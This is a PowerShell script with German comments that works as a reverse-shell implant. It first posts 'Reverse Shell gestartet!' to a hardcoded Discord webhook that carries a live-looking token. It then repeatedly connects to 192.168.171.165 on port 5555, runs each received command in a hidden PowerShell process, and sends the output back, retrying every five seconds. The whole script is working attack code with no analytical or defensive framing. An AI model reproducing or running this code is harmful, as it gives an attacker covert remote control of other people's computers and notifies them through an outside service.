#discord

$webhookUrl = 'https://discord.com/api/webhooks/1195732732693717112/KkX_ctFkiqFGDQwCR_UhhwDh5kAD-27vdiDdEw8sYPhFvKNoGsq39Wxk8MQhvC9GxaGv'
function Send-DiscordMessage {
    param (
        [string]$Message
    )
    $jsonPayload = @{
        content = $Message
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'
}
Send-DiscordMessage -Message 'Reverse Shell gestartet!'

#Reverseshell

$ip = '192.168.171.165'
$port = 5555

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($ip, $port)

        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader $stream
        $writer = New-Object System.IO.StreamWriter $stream

        while ($true) {
            $command = $reader.ReadLine()
            if ($command -eq $null) {
                break
            }

            $process = New-Object System.Diagnostics.Process
            $process.StartInfo.FileName = 'powershell.exe'
            $process.StartInfo.Arguments = '-NoProfile -NonInteractive -Command -'
            $process.StartInfo.RedirectStandardInput = $true
            $process.StartInfo.RedirectStandardOutput = $true
            $process.StartInfo.UseShellExecute = $false
            $process.StartInfo.CreateNoWindow = $true
            $process.Start()
            $inputStream = $process.StandardInput
            $outputStream = $process.StandardOutput
            $inputStream.WriteLine($command)
            $inputStream.Close()
            $output = $outputStream.ReadToEnd()
            $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
            $stream.Write($outputBytes, 0, $outputBytes.Length)
            $stream.Flush()
            $process.WaitForExit()
        }
    } catch {
        # Fehlerbehandlung, wenn eine Ausnahme auftritt
    } finally {
        $client.Close()
    }

    # Kurze Pause, um die CPU nicht zu überlasten
    Start-Sleep -Seconds 5
}
